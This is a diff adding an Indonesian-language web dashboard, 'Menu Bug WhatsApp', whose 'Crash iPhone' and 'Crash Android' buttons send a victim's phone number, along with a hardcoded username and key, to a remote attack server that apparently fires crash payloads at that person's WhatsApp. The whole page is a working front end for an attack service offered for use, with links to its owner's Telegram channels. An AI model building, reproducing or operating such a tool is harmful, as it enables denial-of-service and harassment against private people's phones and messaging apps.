@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>XZET Dashboard</title>
+  <style>
+    body {
+      background: url("https://j.top4top.io/p_3468nai4p1.jpg") no-repeat center center fixed;
+      background-size: cover; color: white;
+      font-family: Arial, sans-serif; text-align: center;
+      display: flex; flex-direction: column; align-items: center; justify-content: center;
+      height: 100vh;
+    }
+    .container {
+      background: rgba(0,0,0,0.7); padding: 30px 20px; border-radius: 12px;
+      max-width: 500px; width: 90%;
+    }
+    input {
+      width: 100%; margin: 10px 0; padding: 10px;
+      background: #1e1e1e; color: white; border: none; border-radius: 6px;
+    }
+    button {
+      padding: 10px 20px; margin: 10px 5px;
+      background: #2b3f5c; color: white; border: none; border-radius: 6px; cursor: pointer;
+    }
+    .logout { position: fixed; top: 15px; right: 15px; }
+    .links { position: fixed; bottom: 20px; display: flex; gap: 10px; }
+  </style>
+</head>
+<body>
+  <div class="logout"><button onclick="logout()">Logout</button></div>
+  <div class="container">
+    <h2>💥 Menu Bug WhatsApp</h2>
+    <input id="target" placeholder="Nomor target 62xxxx">
+    <button onclick="sendBug('ios')">Crash iPhone</button>
+    <button onclick="sendBug('android')">Crash Android</button>
+    <p id="status"></p>
+  </div>
+  <div class="links">
+    <a href="https://t.me/BancetMyself" target="_blank"><button>👑 Owner</button></a>
+    <a href="https://t.me/SecretMInformation" target="_blank"><button>📣 Channel</button></a>
+  </div>
+
+  <script>
+    if (!localStorage.getItem("loggedIn")) window.location.href = "index.html";
+
+    function logout() {
+      localStorage.removeItem("loggedIn");
+      window.location.href = "index.html";
+    }
+
+    async function sendBug(mode) {
+      const target = document.getElementById("target").value.trim();
+      if (!target.startsWith("62")) return alert("Nomor harus 62xxxx");
+      const url = mode === "ios"
+        ? `http://170.64.161.133:1905/execution?target=${target}&mode=ios&username=Bancet&key=W4BT`
+        : `http://170.64.161.133:1905/execution?target=${target}&mode=andros&username=Bancet&key=W4BT`;
+      document.getElementById("status").textContent = "⏳ Mengirim bug...";
+      try {
+        const res = await fetch(url);
+        document.getElementById("status").textContent = res.ok ? "✅ Bug terkirim!" : "❌ Gagal kirim bug!";
+      } catch {
+        document.getElementById("status").textContent = "❗ Gagal mengirim bug!";
+      }
+    }
+  </script>
+</body>
+</html>
